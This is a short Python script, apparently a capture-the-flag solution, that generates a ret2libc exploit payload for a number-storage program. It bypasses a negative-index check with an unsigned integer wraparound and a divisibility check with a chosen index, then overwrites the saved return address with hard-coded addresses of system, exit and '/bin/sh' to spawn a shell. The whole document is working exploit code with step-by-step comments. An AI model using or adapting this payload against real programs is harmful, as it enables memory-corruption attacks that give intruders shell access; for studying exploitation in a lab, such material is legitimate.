#!/usr/bin/env python
import struct

system = 0xf7e6aed0
exit = 0xf7e5eb70
binsh = 0xf7f897ec

max_u_int = 0xffffffff
eip_offset = 456 + 2**32 # to bypass the check for negative numbers we add max unsigned int

payload = "store\n"
payload += str(int(system)) + "\n"
payload += str(int(eip_offset / 4 )) + "\n" # offset to eip, we devided by 4 because the program multiplies the input by 4 to get the byte offset

payload += "store\n"
payload += str(int(exit)) + "\n"
payload += str(int(eip_offset / 4 ) + 1) + "\n"

payload += "store\n"
payload += str(int(binsh)) + "\n"
payload += "116\n" # we used 116 because eip_offset / 4  + 1 give us number that is devided by 3, and the program checks if the input is devided by 3

payload += "quit\n"

print(payload)
